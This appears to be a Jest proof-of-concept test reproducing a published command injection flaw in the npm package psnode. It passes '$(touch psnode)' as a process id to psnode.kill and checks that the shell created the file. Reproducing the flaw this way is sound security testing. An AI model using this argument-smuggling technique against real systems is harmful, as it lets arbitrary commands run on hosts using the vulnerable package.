//https://snyk.io/vuln/SNYK-JS-PSNODE-1078543
test("Command Injection in psnode", () => {
  const psnode = require("psnode");
  const fs = require("fs");
  const path = "./psnode";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  psnode.kill("$(touch psnode)", function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
